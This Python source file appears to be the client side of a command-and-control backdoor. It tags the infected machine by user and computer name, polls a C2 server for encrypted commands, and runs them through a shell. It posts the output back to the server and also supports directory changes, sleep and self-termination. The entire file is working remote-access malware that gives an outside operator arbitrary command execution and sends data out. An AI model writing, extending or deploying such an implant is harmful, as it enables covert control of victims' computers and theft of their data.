from time import time, sleep
from requests import get, post, exceptions
from subprocess import run, PIPE, STDOUT
from encryption import cipher
from settings import PORT, CMD_REQUEST, CWD_RESPONSE, RESPONSE, RESPONSE_KEY, C2_SERVER, DELAY, PROXY, HEADER
from os import getenv, chdir, getcwd

client = (getenv("USERNAME", "Unknown_Username") + "@" + getenv("COMPUTERNAME", "Unknown_Computername") + "@" +
          str(time()))

encrypted_client = cipher.encrypt(client.encode()).decode()

def post_to_server(message: str, response_path=RESPONSE):
    try:
        message = cipher.encrypt(message.encode())
        post(f"http://{C2_SERVER}:{PORT}{response_path}", data={RESPONSE_KEY: message},
             headers=HEADER, proxies=PROXY)
    except exceptions.RequestException:
        return

while True:
    try:
        response = get(f"http://{C2_SERVER}:{PORT}{CMD_REQUEST}{encrypted_client}", headers=HEADER, proxies=PROXY)
        print(response.status_code)
        if response.status_code == 404:
            raise exceptions.RequestException
    except exceptions.RequestException:
        sleep(DELAY)
        continue

    command = cipher.decrypt(response.content).decode()

    if command.startswith("cd "):
        directory = command[3:]
        try:
            chdir(directory)
        except FileNotFoundError:
            post_to_server(f"{directory} was not found.\n")
        except NotADirectoryError:
            post_to_server(f"{directory} is not a directory.\n")
        except PermissionError:
            post_to_server(f"You do not have permissions to access {directory}.\n")
        except OSError:
            post_to_server("There was an operating system error on the client.\n")
        else:
            post_to_server(getcwd(), CWD_RESPONSE)
    elif command.startswith("client kill"):
        post_to_server(f"{client} has been killed.\n")
        exit()
    elif command.startswith("client sleep "):
        try:
            delay = float(command.split()[2])
            if delay < 0:
                raise ValueError
        except (IndexError, ValueError):
            post_to_server("You must enter in a positive number for the amount of time to sleep in seconds.\n")
        else:
            post_to_server(f"{client} will sleep for {delay} seconds.\n")
            sleep(delay)
            post_to_server(f"{client} is now awake.\n")
    else:
        command_output = run(command, shell=True, stdout=PIPE, stderr=STDOUT).stdout
        post_to_server(command_output.decode())
